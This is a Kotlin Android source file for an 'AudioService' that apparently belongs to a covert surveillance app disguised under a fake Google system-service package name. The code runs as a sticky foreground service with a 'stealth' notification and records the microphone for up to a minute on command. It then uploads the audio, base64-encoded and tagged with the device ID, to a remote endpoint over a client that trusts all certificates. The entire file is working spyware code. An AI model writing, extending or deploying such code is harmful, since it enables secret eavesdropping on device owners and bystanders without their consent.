package com.google.android.systemservice.services

import android.app.Service
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.IBinder
import android.util.Base64
import android.util.Log
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.utils.StealthNotificationHelper
import com.google.android.systemservice.utils.TrustAllCertificates
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

class AudioService : Service() {
    companion object {
        private const val TAG = "SystemAudio"
        private const val SAMPLE_RATE = 44100
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
    }

    private var audioRecord: AudioRecord? = null
    private var isRecording = false
    private var recordingJob: Job? = null
    private val audioBuffer = ByteArrayOutputStream()

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = TrustAllCertificates.createSecureClientBuilder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "AudioService created")
        startForegroundSilent()
    }

    private fun startForegroundSilent() {
        val notification = StealthNotificationHelper.createStealthNotification(this)
        startForeground(StealthNotificationHelper.AUDIO_SERVICE_ID, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "START_RECORDING" -> startRecording()
            "STOP_RECORDING" -> stopRecording()
        }
        return START_STICKY
    }

    private fun startRecording() {
        if (isRecording) {
            Log.d(TAG, "Already recording")
            return
        }

        Log.d(TAG, "Starting audio recording")
        
        val bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
        
        try {
            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                CHANNEL_CONFIG,
                AUDIO_FORMAT,
                bufferSize * 2
            )

            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "AudioRecord initialization failed")
                return
            }

            isRecording = true
            audioRecord?.startRecording()

            recordingJob = serviceScope.launch {
                val buffer = ByteArray(bufferSize)
                var totalBytesRecorded = 0
                val maxBytes = SAMPLE_RATE * 2 * 60 // 60 seconds max

                while (isRecording && isActive && totalBytesRecorded < maxBytes) {
                    val bytesRead = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                    if (bytesRead > 0) {
                        audioBuffer.write(buffer, 0, bytesRead)
                        totalBytesRecorded += bytesRead
                    }
                }

                if (audioBuffer.size() > 0) {
                    sendAudioToServer()
                }
            }

        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied for audio recording: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting recording: ${e.message}")
        }
    }

    private fun stopRecording() {
        Log.d(TAG, "Stopping audio recording")
        isRecording = false
        
        recordingJob?.cancel()
        
        try {
            audioRecord?.stop()
            audioRecord?.release()
            audioRecord = null
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping recording: ${e.message}")
        }

        if (audioBuffer.size() > 0) {
            serviceScope.launch {
                sendAudioToServer()
            }
        }
    }

    private suspend fun sendAudioToServer() {
        try {
            val deviceId = android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            )

            val audioData = audioBuffer.toByteArray()
            audioBuffer.reset()

            val base64Audio = Base64.encodeToString(audioData, Base64.NO_WRAP)

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("audio", base64Audio)
                put("sample_rate", SAMPLE_RATE)
                put("channels", 1)
                put("format", "pcm_s16le")
                put("duration_ms", (audioData.size.toLong() * 1000) / (SAMPLE_RATE * 2))
                put("timestamp", System.currentTimeMillis())
            }

            AndroidConfig.loadFromPreferences(this@AudioService)
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url(AndroidConfig.audioEndpoint)
                .post(body)
                .build()

            withContext(Dispatchers.IO) {
                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.d(TAG, "Audio sent successfully (${audioData.size} bytes)")
                    } else {
                        Log.e(TAG, "Failed to send audio: ${response.code}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error sending audio: ${e.message}")
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopRecording()
        serviceScope.cancel()
    }
}
